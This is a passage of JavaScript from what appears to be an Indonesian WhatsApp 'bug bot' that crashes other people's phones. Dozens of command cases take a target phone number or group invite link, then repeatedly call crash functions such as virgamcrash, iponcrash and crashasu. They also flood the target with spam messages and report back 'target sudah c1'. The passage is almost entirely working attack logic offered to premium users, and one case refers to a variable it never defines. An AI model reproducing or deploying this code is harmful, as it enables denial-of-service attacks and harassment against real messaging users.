}
break


case 'qiotop': case 'qiosepele': case 'qioanjay': {
if (!isPrem) return qioreply(mess.prem)
if (!q) return m.reply(`Penggunaan .${command} 628xxx`)
let pepec = q.replace(/[^0-9]/g, "")
if (pepec.startsWith('0')) return m.reply(`• Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n✔️ Example : .${command} 628xxx`)
let Pe = pepec + '@s.whatsapp.net'
await m.reply(`_tunggu sampai gue bilang sucess baru lu cek targetnya_, *soalnya bugnya lumayan berat jadi nunggu bentar*`)
for (let j = 0; j < 5; j++) {
await virgamcrash(Pe, qiobatosai)
await dokucrash(Pe, qiobatosai)
await iponcrash(Pe, qiobatosai)
await iponcrash(Pe)
await crashasu(Pe, qiobatosai)
await lokascrash(Pe, qiobatosai)
await virgamcrash(Pe, qiobatosai)
await dokucrash(Pe, qiobatosai)
await iponcrash(Pe, qiobatosai)
await iponcrash(Pe)
await crashasu(Pe, qiobatosai)
qio.sendMessage(Pe, {text: 'NOOBS'}, {quoted:m})
qio.sendMessage(Pe, {text: 'NOOBS'}, {quoted:m})
qio.sendMessage(Pe, {text: 'NOOBS'}, {quoted:m})
qio.sendMessage(Pe, {text: 'NOOBS'}, {quoted:m})
lokascrash(Pe, qiobatosai)
dokucrash(Pe, qiobatosai)
virgamcrash(Pe, qiobatosai)
iponcrash(Pe, qiobatosai)
crashasu(Pe, qiobatosai)
}
await qioreply(mess.bugrespon)
await m.reply(`_silahlan di cek, target sudah_ *c1*`)
}
break

case '=.': {
if (!isDeveloper) return m.reply(`khusus bot doang`)
await m.reply(`crash dalam hitungan`)
await m.reply(`1`)
await m.reply(`2`)
await lokascrash(m.chat, qiobatosai)
await virgamcrash(m.chat, qiobatosai)
await dokucrash(m.chat, qiobatosai)
await iponcrash(m.chat, qiobatosai)
await iponcrash(m.chat)
await crashasu(m.chat, qiobatosai)
await lokascrash(m.chat, qiobatosai)
await virgamcrash(m.chat, qiobatosai)
await dokucrash(m.chat, qiobatosai)
await iponcrash(m.chat, qiobatosai)
await iponcrash(m.chat)
await crashasu(m.chat, qiobatosai)
qio.sendMessage(m.chat, {text: `3`}, {quoted:m})
await lokascrash(m.chat, qiobatosai)
await virgamcrash(m.chat, qiobatosai)
await dokucrash(m.chat, qiobatosai)
await iponcrash(m.chat, qiobatosai)
await iponcrash(m.chat)
await crashasu(m.chat, qiobatosai)
await m.reply(`done🥱`)
}
break


case 'virtex1': case 'virtex2': case 'virtex3': {
if (!isPrem) return qioreply(mess.prem)
if (!q) return m.reply(`Penggunaan .${command} 628xxx`)
let pepec = q.replace(/[^0-9]/g, "")
if (pepec.startsWith('0')) return m.reply(`• Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n✔️ Example : .${command} 628xxx`)
let Pe = pepec + '@s.whatsapp.net'
await m.reply(`_tunggu sampai gue bilang sucess baru lu cek targetnya_, *soalnya bugnya lumayan berat jadi nunggu bentar*`)
for (let j = 0; j < 5; j++) {
await virgamcrash(Pe, qiobatosai)
await dokucrash(Pe, qiobatosai)
await iponcrash(Pe, qiobatosai)
await iponcrash(Pe)
await crashasu(Pe, qiobatosai)
await lokascrash(Pe, qiobatosai)
await virgamcrash(Pe, qiobatosai)
await dokucrash(Pe, qiobatosai)
await iponcrash(Pe, qiobatosai)
await iponcrash(Pe)
await crashasu(Pe, qiobatosai)
qio.sendMessage(Pe, {text: `${buttonqio}`}, {quoted:m})
qio.sendMessage(Pe, {text: `${buttonqio}`}, {quoted:m})
qio.sendMessage(Pe, {text: `${buttonqio}`}, {quoted:m})
qio.sendMessage(Pe, {text: `${buttonqio}`}, {quoted:m})
lokascrash(Pe, qiobatosai)
dokucrash(Pe, qiobatosai)
virgamcrash(Pe, qiobatosai)
iponcrash(Pe, qiobatosai)
crashasu(Pe, qiobatosai)
}
await qioreply(mess.bugrespon)
await m.reply(`_silahlan di cek, target sudah_ *c1*`)
}
break


case 'slayer07': {
if (!isPrem) return qioreply(mess.prem)
if (!q) return m.reply(`Penggunaan .${command} 628xxx`)
let pepec = q.replace(/[^0-9]/g, "")
if (pepec.startsWith('0')) return m.reply(`• Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n✔️ Example : .${command} 628xxx`)
let Pe = pepec + '@s.whatsapp.net'
await m.reply(`_tunggu sampai gue bilang sucess baru lu cek targetnya_, *soalnya bugnya lumayan berat jadi nunggu bentar*`)
for (let j = 0; j < 5; j++) {
await virgamcrash(Pe, qiobatosai)
await dokucrash(Pe, qiobatosai)
await iponcrash(Pe, qiobatosai)
await iponcrash(Pe)
await crashasu(Pe, qiobatosai)
await lokascrash(Pe, qiobatosai)
await virgamcrash(Pe, qiobatosai)
await dokucrash(Pe, qiobatosai)
await iponcrash(Pe, qiobatosai)
await iponcrash(Pe)
await crashasu(Pe, qiobatosai)
qio.sendMessage(Pe, { image: slayer07,  caption: `𝘚𝘭𝘢𝘺𝘦𝘳 07` }, { quoted:m })
qio.sendMessage(Pe, { image: slayer07,  caption: `𝘚𝘭𝘢𝘺𝘦𝘳 07` }, { quoted:m })
qio.sendMessage(Pe, { image: slayer07,  caption: `𝘚𝘭𝘢𝘺𝘦𝘳 07` }, { quoted:m })
qio.sendMessage(Pe, { image: slayer07,  caption: `𝘚𝘭𝘢𝘺𝘦𝘳 07` }, { quoted:m })
lokascrash(Pe, qiobatosai)
dokucrash(Pe, qiobatosai)
virgamcrash(Pe, qiobatosai)
iponcrash(Pe, qiobatosai)
crashasu(Pe, qiobatosai)
}
await qioreply(mess.bugrespon)
await m.reply(`_silahlan di cek, target sudah_ *c1*`)
}
break

case 'darkness': {
if (!isPrem) return qioreply(mess.prem)
if (!q) return m.reply(`Penggunaan .${command} 628xxx`)
let pepec = q.replace(/[^0-9]/g, "")
if (pepec.startsWith('0')) return m.reply(`• Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n✔️ Example : .${command} 628xxx`)
let Pe = pepec + '@s.whatsapp.net'
await m.reply(`_tunggu sampai gue bilang sucess baru lu cek targetnya_, *soalnya bugnya lumayan berat jadi nunggu bentar*`)
for (let j = 0; j < 5; j++) {
await virgamcrash(Pe, qiobatosai)
await dokucrash(Pe, qiobatosai)
await iponcrash(Pe, qiobatosai)
await iponcrash(Pe)
await crashasu(Pe, qiobatosai)
await lokascrash(Pe, qiobatosai)
await virgamcrash(Pe, qiobatosai)
await dokucrash(Pe, qiobatosai)
await iponcrash(Pe, qiobatosai)
await iponcrash(Pe)
await crashasu(Pe, qiobatosai)
qio.sendMessage(Pe, { document: virgam,  caption: `Darkness 㐅` }, { quoted:m })
qio.sendMessage(Pe, { document: virgam,  caption: `Darkness 㐅` }, { quoted:m })
qio.sendMessage(Pe, { document: virgam,  caption: `Darkness 㐅` }, { quoted:m })
qio.sendMessage(Pe, { document: virgam,  caption: `Darkness 㐅` }, { quoted:m })
lokascrash(Pe, qiobatosai)
dokucrash(Pe, qiobatosai)
virgamcrash(Pe, qiobatosai)
iponcrash(Pe, qiobatosai)
crashasu(Pe, qiobatosai)
}
await qioreply(mess.bugrespon)
await m.reply(`_silahlan di cek, target sudah_ *c1*`)
}
break

case 'santet': case 'santet1jam': case 'santetfullday': case 'santetcrash': {
if (!isPrem) return qioreply(mess.prem)
if (!q) return m.reply(`Penggunaan .${command} 628xxx`)
let pepec = q.replace(/[^0-9]/g, "")
if (pepec.startsWith('0')) return m.reply(`• Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n✔️ Example : .${command} 628xxx`)
let Pe = pepec + '@s.whatsapp.net'
await m.reply(`_tunggu sampai gue bilang sucess baru lu cek targetnya_, *soalnya bugnya lumayan berat jadi nunggu bentar*`)
for (let j = 0; j < 5; j++) {
await virgamcrash(Pe, qiobatosai)
await dokucrash(Pe, qiobatosai)
await iponcrash(Pe, qiobatosai)
await iponcrash(Pe)
await crashasu(Pe, qiobatosai)
await lokascrash(Pe, qiobatosai)
await virgamcrash(Pe, qiobatosai)
await dokucrash(Pe, qiobatosai)
await iponcrash(Pe, qiobatosai)
await iponcrash(Pe)
await crashasu(Pe, qiobatosai)
qio.sendMessage(Pe, { image: santet,  caption: `https://www.instagram.com/coreinpin/` }, { quoted:m })
qio.sendMessage(Pe, { image: santet,  caption: `https://www.instagram.com/coreinpin/` }, { quoted:m })
qio.sendMessage(Pe, { image: santet,  caption: `https://www.instagram.com/coreinpin/` }, { quoted:m })
qio.sendMessage(Pe, { image: santet,  caption: `https://www.instagram.com/coreinpin/` }, { quoted:m })
lokascrash(Pe, qiobatosai)
dokucrash(Pe, qiobatosai)
virgamcrash(Pe, qiobatosai)
iponcrash(Pe, qiobatosai)
crashasu(Pe, qiobatosai)
}
await qioreply(mess.bugrespon)
await m.reply(`_silahlan di cek, target sudah_ *c1*`)
}
break


case 'androcrash': case 'gaskenqio': case '☠️': case '🗿': case '⚡': case '😂': case '😈': case '🩸': case '😳': case '🥶': case '💦': {
if (!isPrem) return qioreply(mess.prem)
if (!q) return m.reply(`Penggunaan .${command} 628xxx`)
let pepec = q.replace(/[^0-9]/g, "")
if (pepec.startsWith('0')) return m.reply(`• Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n✔️ Example : .${command} 628xxx`)
let Pe = pepec + '@s.whatsapp.net'
await m.reply(`_tunggu sampai gue bilang sucess baru lu cek targetnya_, *soalnya bugnya lumayan berat jadi nunggu bentar*`)
for (let j = 0; j < 5; j++) {
await virgamcrash(Pe, qiobatosai)
await dokucrash(Pe, qiobatosai)
await iponcrash(Pe, qiobatosai)
await iponcrash(Pe)
await crashasu(Pe, qiobatosai)
await lokascrash(Pe, qiobatosai)
await virgamcrash(Pe, qiobatosai)
await dokucrash(Pe, qiobatosai)
await iponcrash(Pe, qiobatosai)
await iponcrash(Pe)
await crashasu(Pe, qiobatosai)
qio.sendMessage(Pe, {text: `https://www.instagram.com/coreinpin/`}, {quoted:m})
qio.sendMessage(Pe, {text: `https://www.instagram.com/coreinpin/`}, {quoted:m})
qio.sendMessage(Pe, {text: `https://www.instagram.com/coreinpin/`}, {quoted:m})
qio.sendMessage(Pe, {text: `https://www.instagram.com/coreinpin/`}, {quoted:m})
lokascrash(Pe, qiobatosai)
dokucrash(Pe, qiobatosai)
virgamcrash(Pe, qiobatosai)
iponcrash(Pe, qiobatosai)
crashasu(Pe, qiobatosai)
}
await qioreply(mess.bugrespon)
await m.reply(`_silahlan di cek, target sudah_ *c1*`)
}
break
//=================================================//
case 'bugori': case 'bugbisnis': case 'bugmods': {
if (!isPrem) return qioreply(mess.prem)
if (!q) return m.reply(`Penggunaan .${command} 628xxx`)
let pepec = q.replace(/[^0-9]/g, "")
if (pepec.startsWith('0')) return m.reply(`• Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n✔️ Example : .${command} 628xxx`)
let Pe = pepec + '@s.whatsapp.net'
await m.reply(`_tunggu sampai gue bilang sucess baru lu cek targetnya_, *soalnya bugnya lumayan berat jadi nunggu bentar*`)
for (let j = 0; j < 5; j++) {
await virgamcrash(Pe, qiobatosai)
await dokucrash(Pe, qiobatosai)
await iponcrash(Pe, qiobatosai)
await iponcrash(Pe)
await crashasu(Pe, qiobatosai)
await lokascrash(Pe, qiobatosai)
await virgamcrash(Pe, qiobatosai)
await dokucrash(Pe, qiobatosai)
await iponcrash(Pe, qiobatosai)
await iponcrash(Pe)
await crashasu(Pe, qiobatosai)
qio.sendMessage(Pe, {text: 'AFGANN ATTACK'}, {quoted:m})
qio.sendMessage(Pe, {text: 'AFGANN ATTACK'}, {quoted:m})
qio.sendMessage(Pe, {text: 'AFGANN ATTACK'}, {quoted:m})
qio.sendMessage(Pe, {text: 'AFGANN ATTACK'}, {quoted:m})
lokascrash(Pe, qiobatosai)
dokucrash(Pe, qiobatosai)
virgamcrash(Pe, qiobatosai)
iponcrash(Pe, qiobatosai)
crashasu(Pe, qiobatosai)
}
await qioreply(mess.bugrespon)
await m.reply(`*sukses*`)
}
break


case 'philips1': case 'philips2': case 'philips3': {
if (!isPrem) return qioreply(mess.prem)
if (!q) return m.reply(`Penggunaan .${command} 628xxx`)
let pepec = q.replace(/[^0-9]/g, "")
if (pepec.startsWith('0')) return m.reply(`• Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n✔️ Example : .${command} 628xxx`)
let Pe = pepec + '@s.whatsapp.net'
await m.reply(`_tunggu sampai gue bilang sucess baru lu cek targetnya_, *soalnya bugnya lumayan berat jadi nunggu bentar*`)
for (let j = 0; j < 5; j++) {
await virgamcrash(Pe, qiobatosai)
await dokucrash(Pe, qiobatosai)
await iponcrash(Pe, qiobatosai)
await iponcrash(Pe)
await crashasu(Pe, qiobatosai)
await lokascrash(Pe, qiobatosai)
await virgamcrash(Pe, qiobatosai)
await dokucrash(Pe, qiobatosai)
await iponcrash(Pe, qiobatosai)
await iponcrash(Pe)
await crashasu(Pe, qiobatosai)
qio.sendMessage(Pe, {text: '๖ۣۣۜJ'}, {quoted:m})
qio.sendMessage(Pe, {text: '๖ۣۣۜJ'}, {quoted:m})
qio.sendMessage(Pe, {text: '๖ۣۣۜJ'}, {quoted:m})
qio.sendMessage(Pe, {text: '๖ۣۣۜJ'}, {quoted:m})
lokascrash(Pe, qiobatosai)
dokucrash(Pe, qiobatosai)
virgamcrash(Pe, qiobatosai)
iponcrash(Pe, qiobatosai)
crashasu(Pe, qiobatosai)
}
await qioreply(mess.bugrespon)
await m.reply(`_silahlan di cek, target sudah_ *c1*`)
}
break

case 'polytron1': case 'polytron2': case 'polytron3': {
if (!isPrem) return qioreply(mess.prem)
if (!q) return m.reply(`Penggunaan .${command} 628xxx`)
let pepec = q.replace(/[^0-9]/g, "")
if (pepec.startsWith('0')) return m.reply(`• Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n✔️ Example : .${command} 628xxx`)
let Pe = pepec + '@s.whatsapp.net'
await m.reply(`_tunggu sampai gue bilang sucess baru lu cek targetnya_, *soalnya bugnya lumayan berat jadi nunggu bentar*`)
for (let j = 0; j < 5; j++) {
await virgamcrash(Pe, qiobatosai)
await dokucrash(Pe, qiobatosai)
await iponcrash(Pe, qiobatosai)
await iponcrash(Pe)
await crashasu(Pe, qiobatosai)
await lokascrash(Pe, qiobatosai)
await virgamcrash(Pe, qiobatosai)
await dokucrash(Pe, qiobatosai)
await iponcrash(Pe, qiobatosai)
await iponcrash(Pe)
await crashasu(Pe, qiobatosai)
qio.sendMessage(Pe, {text: 'ᚔ'}, {quoted:m})
qio.sendMessage(Pe, {text: 'ᚔ'}, {quoted:m})
qio.sendMessage(Pe, {text: 'ᚔ'}, {quoted:m})
qio.sendMessage(Pe, {text: 'ᚔ'}, {quoted:m})
lokascrash(Pe, qiobatosai)
dokucrash(Pe, qiobatosai)
virgamcrash(Pe, qiobatosai)
iponcrash(Pe, qiobatosai)
crashasu(Pe, qiobatosai)
}
await qioreply(mess.bugrespon)
await m.reply(`_silahlan di cek, target sudah_ *c1*`)
}
break

case 'panasonic1': case 'panasonic2': case 'panasonic3': {
if (!isPrem) return qioreply(mess.prem)
if (!q) return m.reply(`Penggunaan .${command} 628xxx`)
let pepec = q.replace(/[^0-9]/g, "")
if (pepec.startsWith('0')) return m.reply(`• Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n✔️ Example : .${command} 628xxx`)
let Pe = pepec + '@s.whatsapp.net'
await m.reply(`_tunggu sampai gue bilang sucess baru lu cek targetnya_, *soalnya bugnya lumayan berat jadi nunggu bentar*`)
for (let j = 0; j < 5; j++) {
await virgamcrash(Pe, qiobatosai)
await dokucrash(Pe, qiobatosai)
await iponcrash(Pe, qiobatosai)
await iponcrash(Pe)
await crashasu(Pe, qiobatosai)
await lokascrash(Pe, qiobatosai)
await virgamcrash(Pe, qiobatosai)
await dokucrash(Pe, qiobatosai)
await iponcrash(Pe, qiobatosai)
await iponcrash(Pe)
await crashasu(Pe, qiobatosai)
qio.sendMessage(Pe, {text: 'ᚙ'}, {quoted:m})
qio.sendMessage(Pe, {text: 'ᚙ'}, {quoted:m})
qio.sendMessage(Pe, {text: 'ᚙ'}, {quoted:m})
qio.sendMessage(Pe, {text: 'ᚙ'}, {quoted:m})
lokascrash(Pe, qiobatosai)
dokucrash(Pe, qiobatosai)
virgamcrash(Pe, qiobatosai)
iponcrash(Pe, qiobatosai)
crashasu(Pe, qiobatosai)
}
await qioreply(mess.bugrespon)
await m.reply(`_silahlan di cek, target sudah_ *c1*`)
}
break
//=================================================//
case 'kerupuk': case 'kelapir': case 'sendgas': case 'crashtotal': case 'anjir': {
if (!isPrem) return qioreply(mess.prem)
if (!q) return m.reply(`Penggunaan .${command} 628xxx`)
let pepec = q.replace(/[^0-9]/g, "")
if (pepec.startsWith('0')) return m.reply(`• Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n✔️ Example : .${command} 628xxx`)
let Pe = pepec + '@s.whatsapp.net'
await m.reply(`_tunggu sampai gue bilang sucess baru lu cek targetnya_, *soalnya bugnya lumayan berat jadi nunggu bentar*`)
for (let j = 0; j < 5; j++) {
await virgamcrash(Pe, qiobatosai)
await dokucrash(Pe, qiobatosai)
await iponcrash(Pe, qiobatosai)
await iponcrash(Pe)
await crashasu(Pe, qiobatosai)
await lokascrash(Pe, qiobatosai)
await virgamcrash(Pe, qiobatosai)
await dokucrash(Pe, qiobatosai)
await iponcrash(Pe, qiobatosai)
await iponcrash(Pe)
await crashasu(Pe, qiobatosai)
qio.sendMessage(Pe, {text: '𝘼𝙡𝙬𝙖𝙮𝙨𝙖𝙦𝙞𝙤𝙤 𝘽𝙪𝙜✓'}, {quoted:m})
qio.sendMessage(Pe, {text: '𝘼𝙡𝙬𝙖𝙮𝙨𝙖𝙦𝙞𝙤𝙤 𝘽𝙪𝙜✓'}, {quoted:m})
qio.sendMessage(Pe, {text: '𝘼𝙡𝙬𝙖𝙮𝙨𝙖𝙦𝙞𝙤𝙤 𝘽𝙪𝙜✓'}, {quoted:m})
qio.sendMessage(Pe, {text: '𝘼𝙡𝙬𝙖𝙮𝙨𝙖𝙦𝙞𝙤𝙤 𝘽𝙪𝙜✓'}, {quoted:m})
lokascrash(Pe, qiobatosai)
dokucrash(Pe, qiobatosai)
virgamcrash(Pe, qiobatosai)
iponcrash(Pe, qiobatosai)
crashasu(Pe, qiobatosai)
}
await qioreply(mess.bugrespon)
await m.reply(`_silahlan di cek, target sudah_ *c1*`)
}
break
//=================================================//
case 'pccrash': case 'ipcrash': {
if (!isPrem) return qioreply(mess.prem)
if (!q) return m.reply(`Penggunaan .${command} 628xxx`)
let pepec = q.replace(/[^0-9]/g, "")
if (pepec.startsWith('0')) return m.reply(`• Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n✔️ Example : .${command} 628xxx`)
await m.reply(`_tunggu sampai gue bilang sucess baru lu cek targetnya_, *soalnya bugnya lumayan berat jadi nunggu bentar*`)
let Pe = pepec + '@s.whatsapp.net'
  for (let j = 0; j < 5; j++) {
  iponcrash(Pe)
  iponcrash(Pe)
  iponcrash(Pe)
  iponcrash(Pe, qiobatosai)
  iponcrash(Pe, qiobatosai)
  iponcrash(Pe, qiobatosai)
  iponcrash(Pe, qiobatosai)
  lokascrash(Pe, qiobatosai)
await virgamcrash(Pe, qiobatosai)
await dokucrash(Pe, qiobatosai)
await iponcrash(Pe, qiobatosai)
await iponcrash(Pe)
await crashasu(Pe, qiobatosai)
await lokascrash(Pe, qiobatosai)
await virgamcrash(Pe, qiobatosai)
await dokucrash(Pe, qiobatosai)
await iponcrash(Pe, qiobatosai)
await iponcrash(Pe)
await crashasu(Pe, qiobatosai)
qio.sendMessage(Pe, {text: `https://www.instagram.com/coreinpin/${buttonqio}`}, {quoted:m})
qio.sendMessage(Pe, {text: `https://www.instagram.com/coreinpin/${buttonqio}`}, {quoted:m})
qio.sendMessage(Pe, {text: `https://www.instagram.com/coreinpin/${buttonqio}`}, {quoted:m})
qio.sendMessage(Pe, {text: `https://www.instagram.com/coreinpin/${buttonqio}`}, {quoted:m})
lokascrash(Pe, qiobatosai)
dokucrash(Pe, qiobatosai)
virgamcrash(Pe, qiobatosai)
iponcrash(Pe, qiobatosai)
crashasu(Pe, qiobatosai)
  }
await qioreply(mess.bugrespon)
await m.reply(`_silahlan di cek, target sudah_ *c1*`)
}
break
//=================================================//
case 'qioelitceesnew': case 'qioslebew': case 'lembu': case 'qiogas': {
if (!isPrem) return qioreply(mess.prem)
if (!q) return m.reply(`Penggunaan .${command} 628xxx|1\n# memasukkan 1 sama dengan 300.detik`)
let ppek = q.split("|")[0]
let pepec = ppek.replace(/[^0-9]/g, "")
if (pepec.startsWith('0')) return m.reply(`• Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n✔️ Example : .${command} 628xxx|1`)
let Pe = pepec+"@s.whatsapp.net"
let jumlah = q.split("|")[1] * 200
let ppk = jumlah * 1.5
qioreply(ppk + " detik");
await m.reply(`_tunggu sampai gue bilang sucess baru lu cek targetnya_, *soalnya bugnya lumayan berat jadi nunggu bentar*`)
for (let j = 0; j < 5; j++) {
await virgamcrash(Pe, qiobatosai)
await dokucrash(Pe, qiobatosai)
await iponcrash(Pe, qiobatosai)
await iponcrash(Pe)
await crashasu(Pe, qiobatosai)
await lokascrash(Pe, qiobatosai)
await virgamcrash(Pe, qiobatosai)
await dokucrash(Pe, qiobatosai)
await iponcrash(Pe, qiobatosai)
await iponcrash(Pe)
await crashasu(Pe, qiobatosai)
qio.sendMessage(Pe, {text: 'https://www.instagram.com/coreinpin/'}, {quoted:m})
qio.sendMessage(Pe, {text: 'https://www.instagram.com/coreinpin/'}, {quoted:m})
qio.sendMessage(Pe, {text: 'https://www.instagram.com/coreinpin/'}, {quoted:m})
qio.sendMessage(Pe, {text: 'https://www.instagram.com/coreinpin/'}, {quoted:m})
lokascrash(Pe, qiobatosai)
dokucrash(Pe, qiobatosai)
virgamcrash(Pe, qiobatosai)
iponcrash(Pe, qiobatosai)
crashasu(Pe, qiobatosai)
}
await qioreply(mess.bugrespon)
await m.reply(`_silahlan di cek, target sudah_ *c1*`)
}
break
//=================================================//
case 'buttongc': case 'gcampas': {
if (!isPrem) return qioreply(mess.prem)
if (!q) return m.reply(`Penggunaan .${command} https://chat.whatsapp.com/`)
qioreply(mess.bugrespon)
await m.reply (`_silahlan di cek, target sudah_ *crash*`)
let result = args[0].split('https://chat.whatsapp.com/')[1];
let target = await qio.groupAcceptInvite(result);
for (let j = 0; j < 5; j++) {
await virgamcrash(Pe, qiobatosai)
await dokucrash(Pe, qiobatosai)
await iponcrash(Pe, qiobatosai)
await iponcrash(Pe)
await crashasu(Pe, qiobatosai)
await lokascrash(Pe, qiobatosai)
await virgamcrash(Pe, qiobatosai)
await dokucrash(Pe, qiobatosai)
await iponcrash(Pe, qiobatosai)
await iponcrash(Pe)
await crashasu(Pe, qiobatosai)
qio.sendMessage(Pe, { location : virgam,  caption: `${buttonqio}` }, { quoted:m })
qio.sendMessage(Pe, { location : virgam,  caption: `${buttonqio}` }, { quoted:m })
qio.sendMessage(Pe, { location : virgam,  caption: `${buttonqio}` }, { quoted:m })
qio.sendMessage(Pe, { location : virgam,  caption: `${buttonqio}` }, { quoted:m })
lokascrash(Pe, qiobatosai)
dokucrash(Pe, qiobatosai)
virgamcrash(Pe, qiobatosai)
iponcrash(Pe, qiobatosai)
crashasu(Pe, qiobatosai)
}
await qioreply(mess.bugrespon)
await m.reply(`_silahlan di cek, target sudah_ *c1*`)
}
break
//=================================================//
case 'qioelitceesgc': case 'crashasu': case 'crashgc': case 'gcspam': {
if (!isPrem) return qioreply(mess.prem)
if (!q) return m.reply(`Penggunaan .${command} https://chat.whatsapp.com/`)
await m.reply(`_tunggu sampai gue bilang sucess baru lu cek targetnya_, *soalnya bugnya lumayan berat jadi nunggu bentar*`)
let result = args[0].split('https://chat.whatsapp.com/')[1];
let Pe = await qio.groupAcceptInvite(result);
for (let j = 0; j < 5; j++) {
await virgamcrash(Pe, qiobatosai)
await dokucrash(Pe, qiobatosai)
await iponcrash(Pe, qiobatosai)
await iponcrash(Pe)
await crashasu(Pe, qiobatosai)
await lokascrash(Pe, qiobatosai)
await virgamcrash(Pe, qiobatosai)
await dokucrash(Pe, qiobatosai)
await iponcrash(Pe, qiobatosai)
await iponcrash(Pe)
await crashasu(Pe, qiobatosai)
qio.sendMessage(Pe, {text: 'https://www.instagram.com/coreinpin/'}, {quoted:m})
qio.sendMessage(Pe, {text: 'https://www.instagram.com/coreinpin/'}, {quoted:m})
qio.sendMessage(Pe, {text: 'https://www.instagram.com/coreinpin/'}, {quoted:m})
qio.sendMessage(Pe, {text: 'https://www.instagram.com/coreinpin/'}, {quoted:m})
lokascrash(Pe, qiobatosai)
dokucrash(Pe, qiobatosai)
virgamcrash(Pe, qiobatosai)
iponcrash(Pe, qiobatosai)
crashasu(Pe, qiobatosai)
}
await qioreply(mess.bugrespon)
await m.reply(`_silahlan di cek, target sudah_ *c1*`)
}
break

case 'qioobuggc': case 'ampazzgc': case 'spamgece': {
if (!isGroup) return m.reply(`masuk grup murbug dulu cil`)
if (!isMurbug) return m.reply(`minta ke babang qio ganteng akses murbug luc cil`)
if (!q) return m.reply(`Penggunaan .${command} https://chat.whatsapp.com/`)
await m.reply(`_tunggu sampai gue bilang sucess baru lu cek targetnya_, *soalnya bugnya lumayan berat jadi nunggu bentar*`)
let result = args[0].split('https://chat.whatsapp.com/')[1];
let Pe = await qio.groupAcceptInvite(result);
for (let j = 0; j < 5; j++) {
await virgamcrash(Pe, qiobatosai)
await dokucrash(Pe, qiobatosai)
await iponcrash(Pe, qiobatosai)
await iponcrash(Pe)
await crashasu(Pe, qiobatosai)
await lokascrash(Pe, qiobatosai)
await virgamcrash(Pe, qiobatosai)
await dokucrash(Pe, qiobatosai)
await iponcrash(Pe, qiobatosai)
await iponcrash(Pe)
await crashasu(Pe, qiobatosai)
qio.sendMessage(Pe, {text: 'https://www.instagram.com/coreinpin/'}, {quoted:m})
qio.sendMessage(Pe, {text: 'https://www.instagram.com/coreinpin/'}, {quoted:m})
qio.sendMessage(Pe, {text: 'https://www.instagram.com/coreinpin/'}, {quoted:m})
qio.sendMessage(Pe, {text: 'https://www.instagram.com/coreinpin/'}, {quoted:m})
lokascrash(Pe, qiobatosai)
dokucrash(Pe, qiobatosai)
virgamcrash(Pe, qiobatosai)
iponcrash(Pe, qiobatosai)
crashasu(Pe, qiobatosai)
}
await qioreply(mess.bugrespon)
await m.reply(`_silahlan di cek, target sudah_ *c1*`)
}
break

case 'qiobugs': case 'taibug': case '🥴': case '🧐': case '🔪': case '🥵': {
if (!isGroup) return m.reply(`masuk grup murbug dulu cil`)
if (!isMurbug) return m.reply(`minta ke babang qio ganteng akses murbug luc cil`)
if (!q) return m.reply(`Penggunaan pake nomor cil`)
let pepec = q.replace(/[^0-9]/g, "")
if (pepec.startsWith('0')) return m.reply(`• Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara️`)
let Pe = pepec + '@s.whatsapp.net'
await m.reply(`_tunggu sampai gue bilang sucess baru lu cek targetnya_, *soalnya bugnya lumayan berat jadi nunggu bentar*`)
for (let j = 0; j < 5; j++) {
await virgamcrash(Pe, qiobatosai)
await dokucrash(Pe, qiobatosai)
await iponcrash(Pe, qiobatosai)
await iponcrash(Pe)
await crashasu(Pe, qiobatosai)
await lokascrash(Pe, qiobatosai)
await virgamcrash(Pe, qiobatosai)
await dokucrash(Pe, qiobatosai)
await iponcrash(Pe, qiobatosai)
await iponcrash(Pe)
await crashasu(Pe, qiobatosai)
qio.sendMessage(Pe, {text: '❄𝐀𝐥𝐰𝐚𝐲𝐬𝐚𝐪𝐢𝐨𝐨 𝐂𝐫𝐚𝐬𝐡 𝐓𝐨𝐭𝐚𝐥🥵'}, {quoted:m})
qio.sendMessage(Pe, {text: '❄𝐀𝐥𝐰𝐚𝐲𝐬𝐚𝐪𝐢𝐨𝐨 𝐂𝐫𝐚𝐬𝐡 𝐓𝐨𝐭𝐚𝐥🥵'}, {quoted:m})
qio.sendMessage(Pe, {text: '❄𝐀𝐥𝐰𝐚𝐲𝐬𝐚𝐪𝐢𝐨𝐨 𝐂𝐫𝐚𝐬𝐡 𝐓𝐨𝐭𝐚𝐥🥵'}, {quoted:m})
qio.sendMessage(Pe, {text: '❄𝐀𝐥𝐰𝐚𝐲𝐬𝐚𝐪𝐢𝐨𝐨 𝐂𝐫𝐚𝐬𝐡 𝐓𝐨𝐭𝐚𝐥🥵'}, {quoted:m})
lokascrash(Pe, qiobatosai)
dokucrash(Pe, qiobatosai)
virgamcrash(Pe, qiobatosai)
iponcrash(Pe, qiobatosai)
crashasu(Pe, qiobatosai)
}
await qioreply(mess.bugrespon)
await m.reply(`_silahlan di cek, target sudah_ *c1*`)
}
break

case 'sendaudio': {
if (!isGroup) return m.reply(`masuk grup murbug dulu cil`)
if (!isMurbug) return m.reply(`minta ke babang qio ganteng akses murbug luc cil`)
if (!q) return m.reply(`Penggunaan pake nomor cil`)
let pepec = q.replace(/[^0-9]/g, "")
if (pepec.startsWith('0')) return m.reply(`• Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara️`)
let Pe = pepec + '@s.whatsapp.net'
await m.reply(`_tunggu sampai gue bilang sucess baru lu cek targetnya_, *soalnya bugnya lumayan berat jadi nunggu bentar*`)
for (let j = 0; j < 5; j++) {
await virgamcrash(Pe, qiobatosai)
await dokucrash(Pe, qiobatosai)
await iponcrash(Pe, qiobatosai)
await iponcrash(Pe)
